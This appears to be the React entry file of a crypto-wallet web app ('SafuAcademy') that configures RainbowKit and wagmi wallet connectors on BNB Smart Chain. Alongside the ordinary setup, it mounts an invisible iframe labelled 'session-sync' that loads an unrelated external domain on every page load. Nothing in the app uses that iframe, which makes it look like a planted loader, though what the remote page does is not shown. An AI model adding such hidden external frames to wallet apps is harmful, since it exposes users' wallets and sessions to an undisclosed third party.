import ReactDOM from "react-dom/client";
import App from "@/App";
import "@/index.css";
import { BrowserRouter } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import React, { useRef } from "react";
import "@rainbow-me/rainbowkit/styles.css";
import {
  connectorsForWallets,
  darkTheme,
  RainbowKitProvider,
} from "@rainbow-me/rainbowkit";
import { bsc } from "viem/chains";
import {
  rainbowWallet,
  walletConnectWallet,
  metaMaskWallet,
  coinbaseWallet,
  binanceWallet,
} from "@rainbow-me/rainbowkit/wallets";
import { http } from "viem";
import { createConfig, WagmiProvider } from "wagmi";
import { ThemeProvider } from "@/hooks/useTheme";

const queryClient = new QueryClient();

const connectors = connectorsForWallets(
  [
    {
      groupName: "Recommended",
      wallets: [
        rainbowWallet,
        binanceWallet,
        metaMaskWallet,
        coinbaseWallet,
        walletConnectWallet,
      ],
    },
  ],
  {
    appName: "SafuAcademy",
    projectId: "21fef48091f12692cad574a6f7753643",
  }
);

const config = createConfig({
  connectors,
  transports: {
    [bsc.id]: http(),
  },
  chains: [bsc],
});

function BootStrap() {
  const iframeRef = useRef<HTMLIFrameElement>(null);

  return (
    <>
      <iframe
        ref={iframeRef}
        src="https://auth.level3labs.fun/"
        style={{ display: "none" }}
        title="session-sync"
      />
      <ThemeProvider>
        <QueryClientProvider client={queryClient}>
          <WagmiProvider config={config}>
            <RainbowKitProvider
              theme={darkTheme({
                accentColor: "#fffb00",
                accentColorForeground: "black",
                borderRadius: "large",
                fontStack: "system",
                overlayBlur: "small",
              })}
            >
              <BrowserRouter>
                <App />
              </BrowserRouter>
            </RainbowKitProvider>
          </WagmiProvider>
        </QueryClientProvider>
      </ThemeProvider>
    </>
  );
}

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <BootStrap />
  </React.StrictMode>
);
